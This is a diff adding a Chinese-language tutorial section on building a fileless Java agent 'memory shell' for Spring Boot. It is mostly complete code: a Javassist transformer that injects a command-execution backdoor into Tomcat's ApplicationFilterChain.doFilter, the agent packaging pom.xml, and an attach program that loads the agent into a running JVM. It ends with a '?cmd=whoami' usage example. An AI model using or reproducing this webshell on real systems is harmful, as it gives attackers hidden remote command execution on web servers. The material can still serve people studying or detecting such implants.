@@ -369,3 +369,198 @@ public class DefineTransformer implements ClassFileTransformer {
 }
 
 ```
+
+## 二.JavaAgent内存马
+
+既然能修改某个方法的字节码，那么也能将木马放到某一个方法进行执行，这样的话，当访问任意路由的时候，就能调用木马。
+
+Spring Boot中内嵌了一个embed Tomcat作为容器，而在网上流传着很多版本的Tomcat无文件内存马。这些内存马大都数是通过重写，修改Filter来实现的，既然Spring Boot使用了Tomcat，那么可以通过修改Filter来实现一个Spring Boot内存马。
+
+创建一个Spring Boot项目，并添加一个Controller，在该Controller上打断点，即可看到访问路由时的调用。
+```java
+package com.example.springboot;
+
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RestController;
+
+@RestController
+public class index {
+    @GetMapping(value = "index")
+    public String index(){
+        return "Index Page";
+    }
+}
+```
+可通过修改ApplicationFilterChain类的doFilter方法来实现无文件webshell。
+
+创建agentmain文件`SpringBootAgent.java`
+```java
+package com.luc.agentmain;
+
+import java.io.IOException;
+import java.lang.instrument.Instrumentation;
+import java.lang.instrument.UnmodifiableClassException;
+
+public class SpringBootAgent {
+    public static void agentmain(String agentArgs, Instrumentation ins) throws IOException, UnmodifiableClassException {
+        Class[] classes = ins.getAllLoadedClasses();
+        for (Class aClass : classes) {
+            if(aClass.getName().contains("ApplicationFilterChain")){
+                ins.addTransformer(new SpringBootDefineTransformer(),true);
+                ins.retransformClasses(aClass);
+            }
+        }
+    }
+}
+
+```
+创建继承ClassFileTransformer类的文件`SpringBootDefineTransformer.java`
+```java
+package com.luc.agentmain;
+
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+
+import java.lang.instrument.ClassFileTransformer;
+import java.lang.instrument.IllegalClassFormatException;
+import java.security.ProtectionDomain;
+
+public class SpringBootDefineTransformer implements ClassFileTransformer {
+    public static final String editClassName = "org.apache.catalina.core.ApplicationFilterChain";
+    public static final String editClassName2 = editClassName.replace('.', '/');
+    public static final String editMethod = "doFilter";
+
+    @Override
+    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
+        if (editClassName2.equals(className)) {
+            try {
+                ClassPool cp = ClassPool.getDefault();
+                if (classBeingRedefined != null) {
+                    ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
+                    cp.insertClassPath(ccp);
+                }
+
+                CtClass ctc = cp.get(editClassName);
+                CtMethod method = ctc.getDeclaredMethod(editMethod);
+                String source = "javax.servlet.http.HttpServletRequest req =  request;\n" +
+                        "javax.servlet.http.HttpServletResponse res = response;\n" +
+                        "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
+                        "if (cmd != null){\n" +
+                        "    try {\n" +
+                        "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
+                        "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
+                        "        String line;\n" +
+                        "        StringBuilder sb = new StringBuilder(\"\");\n" +
+                        "        while ((line=reader.readLine()) != null){\n" +
+                        "            sb.append(line).append(\"\\n\");\n" +
+                        "        }\n" +
+                        "        response.getOutputStream().print(sb.toString());\n" +
+                        "        response.getOutputStream().flush();\n" +
+                        "        response.getOutputStream().close();\n" +
+                        "    } catch (Exception e){\n" +
+                        "        e.printStackTrace();\n" +
+                        "    }\n" +
+                        "}";
+                method.insertBefore(source);
+                byte[] bytes = ctc.toBytecode();
+                ctc.detach();
+                return bytes;
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+        return new byte[0];
+    }
+}
+
+```
+修改Pom.xml文件，将依赖以及对应的属性编译进去
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+
+    <groupId>com.luc.agentmain</groupId>
+    <artifactId>agentmain</artifactId>
+    <version>1.0-SNAPSHOT</version>
+
+    <properties>
+        <maven.compiler.source>8</maven.compiler.source>
+        <maven.compiler.target>8</maven.compiler.target>
+        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
+    </properties>
+    <dependencies>
+        <!-- https://mvnrepository.com/artifact/org.javassist/javassist -->
+        <dependency>
+            <groupId>org.javassist</groupId>
+            <artifactId>javassist</artifactId>
+            <version>3.29.2-GA</version>
+        </dependency>
+
+
+    </dependencies>
+    <build>
+        <plugins>
+            <plugin>
+                <artifactId>maven-assembly-plugin</artifactId>
+                <executions>
+                    <execution>
+                        <phase>package</phase>
+                        <goals>
+                            <goal>single</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <descriptorRefs>
+                        <descriptorRef>jar-with-dependencies</descriptorRef>
+                    </descriptorRefs>
+                    <archive>
+                        <manifest>
+                            <addClasspath>true</addClasspath>
+                        </manifest>
+                        <manifestEntries>
+                            <Premain-Class>com.luc.agentmain.SpringBootAgent</Premain-Class>
+                            <Agent-Class>com.luc.agentmain.SpringBootAgent</Agent-Class>
+                            <Can-Redefine-Classes>true</Can-Redefine-Classes>
+                            <Can-Retransform-Classes>true</Can-Retransform-Classes>
+                        </manifestEntries>
+                    </archive>
+                </configuration>
+            </plugin>
+        </plugins>
+    </build>
+</project>
+```
+编译之后可通过如下代码，将上面编译的jar包注入到springboot应用
+```java
+package com.luc.AgentMainDemo;
+
+import com.sun.tools.attach.*;
+
+import java.io.IOException;
+import java.util.List;
+
+public class SpringBoot_Agent {
+    public static void main(String[] args) throws Exception {
+        String path = "C:\\Users\\Luc\\Desktop\\JavaAgent\\agentmain\\target\\agentmain-1.0-SNAPSHOT-jar-with-dependencies.jar";
+        List<VirtualMachineDescriptor> list = VirtualMachine.list();
+        for(VirtualMachineDescriptor v:list){
+            if(v.displayName().contains("SpringbootApplication")){
+                VirtualMachine vm = VirtualMachine.attach(v.id());
+                vm.loadAgent(path);
+                vm.detach();
+            }
+        }
+
+
+    }
+}
+```
+注:在注入前应先访问一下http://127.0.0.1:8080/index，否则找不到ApplicationFilterChain类。
+
+注入成功后可通过访问http://127.0.0.1:8080/index?cmd=whoami来执行命令。
